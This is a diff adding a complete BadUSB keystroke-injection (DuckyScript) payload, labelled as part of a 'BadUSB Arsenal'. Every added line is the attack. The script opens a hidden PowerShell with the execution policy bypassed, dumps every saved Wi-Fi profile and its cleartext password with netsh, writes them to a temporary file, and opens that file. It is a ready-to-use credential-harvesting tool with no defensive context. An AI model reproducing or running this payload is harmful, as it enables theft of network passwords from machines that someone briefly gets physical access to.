@@ -1,0 +1,7 @@
+REM Windows Saved Wi-Fi Profile & Cleartext Password Extractor
+REM Hard-Tools BadUSB Arsenal
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$w = (netsh wlan show profiles) | Select-String '\:(.+)$' | ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object { $pass = (netsh wlan show profile name=\"$name\" key=clear) | Select-String 'Key Content\s+\:\s+(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }; [PSCustomObject]@{ SSID = $name; Password = if ($pass) { $pass } else { '<None/Open>' } } }; $w | Out-File -FilePath \"$env:TEMP\wifi_passwords.txt\"; Start-Process notepad.exe \"$env:TEMP\wifi_passwords.txt\""
+ENTER
